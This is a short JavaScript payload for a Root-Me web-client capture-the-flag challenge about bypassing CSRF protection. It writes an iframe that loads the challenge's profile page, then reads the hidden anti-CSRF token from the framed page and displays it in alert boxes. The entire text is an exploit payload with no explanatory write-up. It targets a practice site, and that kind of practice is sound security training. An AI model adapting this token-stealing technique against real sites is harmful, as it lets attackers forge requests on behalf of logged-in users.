alert("test CSRF");
document.writeln('<iframe id="iframe2" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="300" height="300" onload="read()"></iframe>');
function read()
{
    alert("test iframe");
    alert(document.getElementById("iframe2").contentDocument.getElementById("profile").token.value);
}